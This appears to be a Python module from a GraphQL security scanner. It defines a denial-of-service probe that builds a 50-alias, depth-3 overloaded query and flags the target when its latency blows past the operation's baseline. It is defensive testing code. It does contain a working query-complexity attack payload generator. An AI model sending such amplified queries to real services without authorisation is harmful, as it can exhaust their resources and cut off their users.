"""Denial-of-service (query complexity) family.

Amplifies query cost and confirms via the latency oracle: a deeply nested or
alias-overloaded query whose response time blows past the operation's baseline
is a real complexity-DoS signal. The probe is only built when the operation's
return type is nestable, so a scalar query is never flagged.
"""

from __future__ import annotations

from prediql.generation.query_builder import build_selection
from prediql.oracle.evidence import Evidence, Expectation
from prediql.security.families.base import Payload, ProbeFamily
from prediql.model.schema import Operation, Schema


class DenialOfServiceFamily(ProbeFamily):
    id = "denial_of_service"
    max_rounds = 1

    def applies(self, operation, schema, graph) -> bool:
        type_def = schema.type(operation.type.name)
        return type_def is not None and type_def.is_composite

    def seed_payloads(self, operation: Operation, schema: Schema) -> list[Payload]:
        # Alias overloading: the same field selected many times multiplies work
        # without needing a cyclic schema to nest into.
        try:
            selection = build_selection(schema, operation.type.name, depth=3, style="maximal")
        except Exception:
            return []
        if not selection:
            return []
        alias_count = 50
        aliases = " ".join(f"a{i}: {operation.name} {selection}" for i in range(alias_count))
        document = f"query {{ {aliases} }}"
        return [Payload(
            operation.name, document,
            Expectation(self.id, Evidence.DOS, stage="alias-overload",
                        amplification=alias_count),
        )]
